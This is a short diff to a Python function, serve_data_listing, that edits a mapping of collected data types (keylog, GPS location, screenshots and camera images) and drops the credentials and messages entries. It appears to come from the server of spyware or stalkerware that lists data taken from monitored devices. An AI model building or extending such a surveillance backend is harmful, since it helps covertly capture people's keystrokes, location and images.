@@ -14,10 +14,8 @@ def serve_data_listing(request_handler, data_type):
 
         # Map common data types to what's actually in the database
         data_type_mapping = {
-            "credentials": ["credentials", "auth_data", "login"],
             "keylog": ["keylog", "keylogger", "keyboard", "input"],
             "location": ["location", "location_data", "gps"],
-            "messages": ["messages", "message", "sms", "chat"],
             "screenshots": ["screenshot", "screenshots", "screen", "camera", "image", "media_metadata"]
         }
 
